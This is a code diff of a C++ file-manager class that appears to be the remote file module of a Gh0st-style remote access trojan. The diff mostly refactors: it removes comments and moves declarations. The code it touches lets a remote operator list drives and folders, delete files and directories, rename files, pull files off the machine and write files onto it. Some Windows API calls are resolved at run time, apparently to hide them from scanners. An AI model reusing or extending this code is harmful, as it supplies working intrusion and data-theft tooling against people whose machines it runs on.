@@ -34,21 +34,21 @@ void CMyFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 {
 	switch (lpBuffer[0])
 	{
-	case COMMAND_LIST_FILES:// 获取文件列表
+	case COMMAND_LIST_FILES:
 		SendFilesList((TCHAR *)(lpBuffer + 1));
 		break;
-	case COMMAND_DELETE_FILE:// 删除文件
+	case COMMAND_DELETE_FILE:
 		DeleteFile((TCHAR *)(lpBuffer + 1));
 		SendToken(TOKEN_DELETE_FINISH);
 		break;
-	case COMMAND_DELETE_DIRECTORY:// 删除文件
+	case COMMAND_DELETE_DIRECTORY:
 		DeleteDirectory((TCHAR *)(lpBuffer + 1));
 		SendToken(TOKEN_DELETE_FINISH);
 		break;
-	case COMMAND_DOWN_FILES: // 上传文件
+	case COMMAND_DOWN_FILES:
 		UploadToRemote(lpBuffer + 1);
 		break;
-	case COMMAND_CONTINUE: // 上传文件
+	case COMMAND_CONTINUE:
 		SendFileData(lpBuffer + 1);
 		break;
 	case COMMAND_CREATE_FOLDER:
@@ -92,7 +92,7 @@ bool CMyFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
 {
 	ShellExecute(GetDesktopWindow(), _T("open"), lpFile, NULL, NULL, nShowCmd);
 
-	return 0;
+	return false;
 }
 
 UINT CMyFileManager::SendDriveList()
@@ -101,7 +101,6 @@ UINT CMyFileManager::SendDriveList()
 	// 前一个字节为令牌，后面的52字节为驱动器跟相关属性
 	BYTE	DriveList[1024];
 	char	FileSystem[MAX_PATH];
-	char	*pDrive = NULL;
 	DriveList[0] = TOKEN_DRIVE_LIST; // 驱动器列表
 
 	typedef BOOL(WINAPI *GETLOGDS)(DWORD nBufferLength, LPSTR lpBuffer);
@@ -109,7 +108,7 @@ UINT CMyFileManager::SendDriveList()
 	GETLOGDS myGetLogds = (GETLOGDS)GetProcAddress(hdllde, "GetLogicalDriveStringsA");
 	myGetLogds(sizeof(DriveString), DriveString);
 
-	pDrive = DriveString;
+	char *pDrive = DriveString;
 
 	unsigned __int64	HDAmount = 0;
 	unsigned __int64	HDFreeSpace = 0;
@@ -165,11 +164,9 @@ UINT CMyFileManager::SendFilesList(LPCTSTR lpszDirectory)
 	// 重置传输方式
 	m_nTransferMode = TRANSFER_MODE_NORMAL;
 
-	UINT	nRet = 0;
 	TCHAR	strPath[MAX_PATH];
 	TCHAR	*pszFileName = NULL;
 	LPBYTE	lpList = NULL;
-	HANDLE	hFile;
 	DWORD	dwOffset = 0; // 位移指针
 	int		nLen = 0;
 	DWORD	nBufferSize = 1024 * 10; // 先分配10K的缓冲区
@@ -178,7 +175,7 @@ UINT CMyFileManager::SendFilesList(LPCTSTR lpszDirectory)
 	lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
 
 	wsprintf(strPath, _T("%s\\*.*"), lpszDirectory);
-	hFile = FindFirstFile(strPath, &FindFileData);
+	HANDLE hFile = FindFirstFile(strPath, &FindFileData);
 
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
@@ -210,7 +207,7 @@ UINT CMyFileManager::SendFilesList(LPCTSTR lpszDirectory)
 		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
 		dwOffset++;
 		// 文件名 lstrlen(pszFileName) + 1 字节
-		nLen = lstrlen(pszFileName)*sizeof(TCHAR);
+		nLen = lstrlen(pszFileName) * sizeof(TCHAR);
 		memcpy(lpList + dwOffset, pszFileName, nLen);
 		dwOffset += nLen;
 		*(lpList + dwOffset) = 0;
@@ -226,7 +223,7 @@ UINT CMyFileManager::SendFilesList(LPCTSTR lpszDirectory)
 		dwOffset += 8;
 	} while (FindNextFile(hFile, &FindFileData));
 
-	nRet = Send(lpList, dwOffset);
+	UINT nRet = Send(lpList, dwOffset);
 
 	LocalFree(lpList);
 
@@ -245,7 +242,7 @@ bool CMyFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
 	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
 
 	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
-		return FALSE;
+		return false;
 
 	do
 	{
@@ -270,30 +267,26 @@ bool CMyFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
 
 	if (!RemoveDirectory(lpszDirectory))
 	{
-		return FALSE;
+		return false;
 	}
 	return true;
 }
 
 UINT CMyFileManager::SendFileSize(LPCTSTR lpszFileName)
 {
-	UINT	nRet = 0;
 	DWORD	dwSizeHigh;
-	DWORD	dwSizeLow;
-	// 1 字节token, 8字节大小, 文件名称, '\0'
-	HANDLE	hFile;
 	// 保存当前正在操作的文件名
 	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
 	lstrcpy(m_strCurrentProcessFileName, lpszFileName);
 
-	hFile = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+	HANDLE hFile = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 
 	if (hFile == INVALID_HANDLE_VALUE) return FALSE;
 
-	dwSizeLow = GetFileSize(hFile, &dwSizeHigh);
+	DWORD dwSizeLow = GetFileSize(hFile, &dwSizeHigh);
 	CloseHandle(hFile);
 	// 构造数据包，发送文件长度
-	int		nPacketSize = (lstrlen(lpszFileName) + 1)*sizeof(TCHAR) + 9;
+	int		nPacketSize = (lstrlen(lpszFileName) + 1) * sizeof(TCHAR) + 9;
 	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
 	memset(bPacket, 0, nPacketSize);
 
@@ -301,21 +294,19 @@ UINT CMyFileManager::SendFileSize(LPCTSTR lpszFileName)
 	FILESIZE *pFileSize = (FILESIZE *)(bPacket + 1);
 	pFileSize->dwSizeHigh = dwSizeHigh;
 	pFileSize->dwSizeLow = dwSizeLow;
-	memcpy(bPacket + 9, lpszFileName, (lstrlen(lpszFileName) + 1)*sizeof(TCHAR));
+	memcpy(bPacket + 9, lpszFileName, (lstrlen(lpszFileName) + 1) * sizeof(TCHAR));
 
-	nRet = Send(bPacket, nPacketSize);
+	UINT nRet = Send(bPacket, nPacketSize);
 	LocalFree(bPacket);
 	return nRet;
 }
 
 UINT CMyFileManager::SendFileData(LPBYTE lpBuffer)
 {
-	UINT		nRet;
-	FILESIZE	*pFileSize;
-	TCHAR		*lpFileName;
+	UINT nRet = 0;
 
-	pFileSize = (FILESIZE *)lpBuffer;
-	lpFileName = m_strCurrentProcessFileName;
+	FILESIZE *pFileSize = (FILESIZE *)lpBuffer;
+	TCHAR *lpFileName = m_strCurrentProcessFileName;
 
 	// 远程跳过，传送下一个
 	if (pFileSize->dwSizeLow == -1)
@@ -323,8 +314,7 @@ UINT CMyFileManager::SendFileData(LPBYTE lpBuffer)
 		UploadNext();
 		return 0;
 	}
-	HANDLE	hFile;
-	hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+	HANDLE hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 
 	if (hFile == INVALID_HANDLE_VALUE) return -1;
 
@@ -376,7 +366,7 @@ void CMyFileManager::UploadNext()
 		// 上传下一个
 		it = m_UploadList.begin();
 		SendFileSize((*it).c_str());
-	}
+}
 }
 
 int CMyFileManager::SendToken(BYTE bToken)
@@ -415,8 +405,8 @@ bool CMyFileManager::UploadToRemote(LPBYTE lpBuffer)
 bool CMyFileManager::FixedUploadList(LPCTSTR lpPathName)
 {
 	WIN32_FIND_DATA	wfd;
-	TCHAR	lpszFilter[MAX_PATH];
-	TCHAR	*lpszSlash = NULL;
+	TCHAR lpszFilter[MAX_PATH];
+	TCHAR *lpszSlash;
 	memset(lpszFilter, 0, sizeof(lpszFilter));
 
 	if (lpPathName[lstrlen(lpPathName) - 1] != _T('\\'))
@@ -592,24 +582,20 @@ void CMyFileManager::GetFileData()
 
 void CMyFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
 {
-	// 传输完毕
-	BYTE	*pData;
-	DWORD	dwBytesToWrite;
-	DWORD	dwBytesWrite;
-	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
-	FILESIZE	*pFileSize;
+	DWORD dwBytesWrite;
+	int nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
 	// 得到数据的偏移
-	pData = lpBuffer + 8;
+	BYTE *pData = lpBuffer + 8;
 
-	pFileSize = (FILESIZE *)lpBuffer;
+	FILESIZE *pFileSize = (FILESIZE *)lpBuffer;
 
 	// 得到数据在文件中的偏移
-	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
-	LONG	dwOffsetLow = pFileSize->dwSizeLow;
+	LONG dwOffsetHigh = pFileSize->dwSizeHigh;
+	LONG dwOffsetLow = pFileSize->dwSizeLow;
 
-	dwBytesToWrite = nSize - 8;
+	DWORD dwBytesToWrite = nSize - 8;
 
-	HANDLE	hFile = CreateFile(m_strCurrentProcessFileName,
+	HANDLE hFile = CreateFile(m_strCurrentProcessFileName,
 		GENERIC_WRITE,
 		FILE_SHARE_WRITE,
 		NULL,
@@ -619,9 +605,7 @@ void CMyFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
 
 	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
 
-	int nRet = 0;
-	// 写入文件
-	nRet = WriteFile(hFile, pData, dwBytesToWrite, &dwBytesWrite, NULL);
+	int nRet = WriteFile(hFile, pData, dwBytesToWrite, &dwBytesWrite, NULL);
 
 	CloseHandle(hFile);
 	// 为了比较，计数器递增
@@ -651,7 +635,7 @@ void CMyFileManager::Rename(LPBYTE lpBuffer)
 #ifdef _UNICODE
 	MOVEF  myMoveFile = (MOVEF)GetProcAddress(kernel32, "MoveFileW");
 #else
-	MOVEF  myMoveFile= (MOVEF)GetProcAddress(kernel32,"MoveFileA");
+	MOVEF  myMoveFile = (MOVEF)GetProcAddress(kernel32, "MoveFileA");
 #endif
 
 	myMoveFile(lpExistingFileName, lpNewFileName);
